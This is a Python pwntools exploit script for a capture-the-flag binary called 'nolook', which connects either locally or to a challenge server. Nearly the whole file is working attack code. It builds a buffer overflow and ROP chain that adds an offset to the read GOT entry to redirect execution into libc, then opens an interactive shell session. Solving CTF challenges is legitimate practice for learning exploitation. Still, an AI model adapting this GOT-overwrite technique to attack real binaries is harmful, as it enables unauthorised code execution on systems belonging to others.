#!/usr/bin/env python3

from pwn import *
from binascii import hexlify

exe = ELF("nolook_patched")
libc = ELF("libc-2.27.so")
ld = ELF("./ld-2.27.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("nolook.challs.cyberchallenge.it", 9135)

    return r


def main():
    r = conn()

    # good luck pwning :)

    pop_r14_r15 = p64(0x0000000000400680)       # pop r14; pop r15; ret;
    add_r14_0x90_r_15 = p64(0x00000000004005af) # add qword ptr [r14 + 0x90], r15; ret;
    offset_read_gadget = p64(0xffffffffffffffff+1-0x5ce4)
    print(offset_read_gadget)
    got_read = p64(0x0000000000601018)
    plt_read = p64(0x4004a0)

    payload = b'a'*24 + pop_r14_r15 + p64(int.from_bytes(got_read, 'little') - 0x90) + offset_read_gadget + add_r14_0x90_r_15 + plt_read 
    r.send(payload)

    r.interactive()


if __name__ == "__main__":
    main()
